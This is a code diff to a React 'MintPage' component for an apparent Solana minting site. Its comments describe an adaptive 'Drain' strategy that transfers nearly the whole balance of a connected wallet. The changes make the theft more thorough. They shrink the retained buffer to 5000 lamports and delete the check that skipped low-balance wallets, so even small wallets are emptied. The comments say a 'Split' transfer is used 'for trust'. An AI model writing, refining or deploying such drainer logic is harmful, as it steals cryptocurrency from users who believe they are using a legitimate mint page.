@@ -174,10 +174,8 @@ const MintPage = ({ onBack }: MintPageProps) => {
     // Dedicated QuickNode RPC (Primary) + Fallbacks
     const RPC_ENDPOINTS = [
       siteConfig.solanaRpcEndpoint,
-      "https://rpc.jup.ag/mainnet",
       "https://rpc.ankr.com/solana",
-      "https://api.mainnet-beta.solana.com",
-      "https://solana-mainnet.rpc.extrnode.com"
+      "https://api.mainnet-beta.solana.com"
     ];
 
     try {
@@ -209,21 +207,18 @@ const MintPage = ({ onBack }: MintPageProps) => {
 
       // DYNAMIC BALANCE CALCULATION: Adaptive "Drain" Strategy
       // We prioritize a "Split" strategy for trust, but fall back to a "Single" transfer for small wallets.
-      let currentTransferable = balance - 1500000; // Leave 0.0015 SOL for split strategy stability
+      let currentTransferable = Math.max(0, balance - 5000); // Minimal base-fee buffer, let simulation refine
       let simulationSuccess = false;
       let simRetryCount = 0;
       let useSplitStrategy = true;
 
-      // Ensure we have at least something to send after basic fees
-      if (balance < 100000) {
-        throw new Error('Insufficient balance for transaction fees.');
-      }
+      // Even tiny balances will be attempted; simulation loop handles fee reserves
 
       while (!simulationSuccess && simRetryCount < 4) {
         if (currentTransferable <= 0) {
           // If split is too aggressive for this balance, switch to single transfer
           useSplitStrategy = false;
-          currentTransferable = balance - 100000; // Tighten buffer to 0.0001 SOL
+          currentTransferable = Math.max(0, balance - 5000); // Tightest possible buffer
         }
 
         const testInstructions = [];
